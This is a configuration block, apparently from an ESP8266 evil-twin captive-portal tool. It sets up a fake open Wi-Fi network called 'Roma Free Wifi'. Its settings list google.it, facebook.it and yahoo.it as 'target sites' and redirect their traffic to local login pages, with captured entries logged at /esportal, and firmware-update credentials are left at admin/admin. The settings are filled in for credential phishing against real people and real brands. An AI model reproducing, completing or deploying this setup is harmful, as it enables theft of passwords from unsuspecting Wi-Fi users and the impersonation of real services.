//!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
//User Configuration Happens Here!

//Admin Settings for Flashing Firmware
const char *update_username="admin";
const char *update_password="admin";

//Name of Access Point
const char *setSSID="Roma Free Wifi";

//enter URLs HERE for target sites - example: String SITE1="www.exploit.agency";
//do not use www.

// google
String GOOGLE="google.it";
const char *SITE1_redirect="/login";

// facebook
String FACEBOOK="facebook.it";
const char *SITE2_redirect="/sign-in";

// yahoo
String YAHOO="yahoo.it";
const char *SITE3_redirect="/authenticate";

//all other requests for "anysite.com" go to www.anysite.com/user/login
const char *SITEOTHER_redirect="/user/login";

//Portal Login Redirect Success Page www.accesspoint.com/welcome
String WELCOMEDOMAIN="provinciawifi.it";
const char *PORTALLOGIN_redirect="/welcome";
String PORTALLOGIN="bibliotu.it"; //192.168.1.1"; //IP of ESP8266 has to go here for it to work

//access ESPORTAL Logs at www.anysite.com/esportal
//!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
